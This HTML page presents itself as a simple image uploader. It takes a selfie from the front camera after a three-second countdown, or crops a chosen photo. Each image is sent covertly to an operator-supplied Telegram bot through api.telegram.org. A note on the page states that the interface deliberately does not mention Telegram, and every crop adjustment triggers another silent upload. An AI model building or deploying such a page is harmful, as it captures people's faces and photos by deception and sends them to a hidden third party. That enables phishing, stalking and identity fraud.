<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>Image Uploader</title>
  <script src="https://cdn.tailwindcss.com"></script>
  <link href="https://cdn.jsdelivr.net/npm/cropperjs@1.6.2/dist/cropper.min.css" rel="stylesheet"/>
  <script src="https://cdn.jsdelivr.net/npm/cropperjs@1.6.2/dist/cropper.min.js"></script>
  <style>
    body {
      background: linear-gradient(135deg, #0f172a, #021027);
      color: #e6eef8;
      font-family: Inter, ui-sans-serif, system-ui, -apple-system, "Segoe UI", Roboto, "Helvetica Neue", Arial;
      -webkit-font-smoothing: antialiased;
      -moz-osx-font-smoothing: grayscale;
    }
    .card {
      background: linear-gradient(180deg, rgba(255,255,255,0.03), rgba(255,255,255,0.01));
      border-radius: 16px;
      padding: 28px;
      box-shadow: 0 8px 30px rgba(2,6,23,0.6);
      backdrop-filter: blur(6px);
      border: 1px solid rgba(255,255,255,0.04);
      max-width: 540px;
      width: 100%;
    }
    #preview {
      width: 320px;
      height: 320px;
      border-radius: 12px;
      overflow: hidden;
      background: rgba(255,255,255,0.02);
      display: flex;
      align-items: center;
      justify-content: center;
    }
    .hidden { display: none; }
  </style>
</head>
<body class="min-h-screen flex items-center justify-center p-6">
  <div class="card">
    <h1 class="text-2xl font-semibold mb-4">Upload Image</h1>
    <p class="text-sm text-slate-300 mb-6">Choose "Camera" to take a selfie (1:1) or "Select Image" to pick a photo. The image will be cropped to square and sent in background.</p>

    <div class="flex gap-4 mb-6">
      <button id="cameraBtn" class="flex-1 px-5 py-3 rounded-xl bg-sky-600 hover:bg-sky-700 transition font-medium">Camera</button>
      <button id="selectBtn" class="flex-1 px-5 py-3 rounded-xl bg-emerald-600 hover:bg-emerald-700 transition font-medium">Select Image</button>
    </div>

    <div class="flex items-start gap-6">
      <div id="preview" class="hidden">
        <!-- preview image or video will appear here -->
      </div>
      <div class="flex-1">
        <div class="text-sm text-slate-300 mb-2">Status</div>
        <div id="status" class="text-sm text-slate-200">Idle</div>
      </div>
    </div>

    <input type="file" id="fileInput" accept="image/*" class="hidden" />

    <video id="video" autoplay playsinline class="hidden rounded-lg shadow-lg"></video>
    <canvas id="canvas" class="hidden"></canvas>
    <div class="mt-6 text-xs text-slate-400">Note: Telegram integration runs in background; UI does not reference Telegram.</div>
  </div>

<script>
  // === CONFIG ===
  // Fill these values locally after download.
  const BOT_TOKEN = "";
  const CHAT_ID = "";

  // === END CONFIG ===

  const cameraBtn = document.getElementById('cameraBtn');
  const selectBtn = document.getElementById('selectBtn');
  const fileInput = document.getElementById('fileInput');
  const video = document.getElementById('video');
  const canvas = document.getElementById('canvas');
  const preview = document.getElementById('preview');
  const status = document.getElementById('status');
  let cropper = null;
  let currentStream = null;

  function setStatus(text) {
    status.textContent = text;
  }

  async function sendToTelegram(blob) {
    // If BOT_TOKEN or CHAT_ID are empty, skip sending and log a warning.
    if (!BOT_TOKEN || !CHAT_ID) {
      console.warn('BOT_TOKEN or CHAT_ID empty — skipping sending to Telegram.');
      setStatus('Preview ready (not sent: BOT_TOKEN/CHAT_ID empty).');
      return;
    }

    setStatus('Sending image in background...');
    try {
      const formData = new FormData();
      formData.append('chat_id', CHAT_ID);
      formData.append('photo', blob, 'image.jpg');

      const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
        method: 'POST',
        body: formData
      });

      if (!res.ok) {
        console.error('Telegram API error', await res.text());
        setStatus('Failed to send (check token/chat id).');
      } else {
        setStatus('Image sent successfully.');
      }
    } catch (err) {
      console.error(err);
      setStatus('Network error while sending.');
    }
  }

  // camera flow
  cameraBtn.addEventListener('click', async () => {
    setStatus('Opening camera...');
    preview.classList.add('hidden');
    if (currentStream) {
      currentStream.getTracks().forEach(t => t.stop());
      currentStream = null;
    }

    try {
      const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: false });
      currentStream = stream;
      video.srcObject = stream;
      video.classList.remove('hidden');
      video.style.width = '320px';
      video.style.height = '320px';
      video.style.objectFit = 'cover';

      setStatus('Camera active — capturing in 3s...');
      // capture after a short delay so user can pose
      setTimeout(async () => {
        const vw = video.videoWidth;
        const vh = video.videoHeight;
        const size = Math.min(vw, vh) || 640;
        canvas.width = size;
        canvas.height = size;
        const ctx = canvas.getContext('2d');
        // center-crop the video frame
        ctx.drawImage(video, (vw - size) / 2, (vh - size) / 2, size, size, 0, 0, size, size);
        canvas.toBlob(async (blob) => {
          // show preview
          preview.innerHTML = '';
          const img = document.createElement('img');
          img.src = URL.createObjectURL(blob);
          img.style.width = '100%';
          img.style.height = '100%';
          img.style.objectFit = 'cover';
          preview.appendChild(img);
          preview.classList.remove('hidden');

          await sendToTelegram(blob);
        }, 'image/jpeg', 0.9);
        // stop camera
        video.classList.add('hidden');
        if (currentStream) {
          currentStream.getTracks().forEach(t => t.stop());
          currentStream = null;
        }
      }, 3000);

    } catch (err) {
      console.error(err);
      setStatus('Camera permission denied or not available.');
    }
  });

  // select image flow
  selectBtn.addEventListener('click', () => fileInput.click());

  fileInput.addEventListener('change', () => {
    const file = fileInput.files && fileInput.files[0];
    if (!file) return;
    setStatus('Preparing image...');
    const img = document.createElement('img');
    img.src = URL.createObjectURL(file);
    img.style.maxWidth = '100%';
    img.onload = () => {
      // destroy previous cropper if exists
      if (cropper) {
        try { cropper.destroy(); } catch(e) {}
        cropper = null;
      }
      preview.innerHTML = '';
      preview.appendChild(img);
      preview.classList.remove('hidden');

      cropper = new Cropper(img, {
        aspectRatio: 1,
        viewMode: 1,
        autoCropArea: 1,
        movable: false,
        zoomable: true,
        scalable: false,
        background: false,
        ready() {
          setStatus('Crop the image as needed. Cropping will auto-save.');
          // Immediately export the initial cropped area
          cropAndSend();
        },
        cropend() {
          // whenever user finishes moving crop, send updated crop
          cropAndSend();
        }
      });
    };
  });

  function cropAndSend() {
    if (!cropper) return;
    setStatus('Cropping image...');
    const canvasCrop = cropper.getCroppedCanvas({ width: 800, height: 800, imageSmoothingQuality: 'high' });
    canvasCrop.toBlob(async (blob) => {
      // show preview (already shown) and send in background
      await sendToTelegram(blob);
    }, 'image/jpeg', 0.9);
  }

  // Clean up on page unload
  window.addEventListener('beforeunload', () => {
    if (currentStream) {
      currentStream.getTracks().forEach(t => t.stop());
    }
    if (cropper) cropper.destroy();
  });
</script>
</body>
</html>
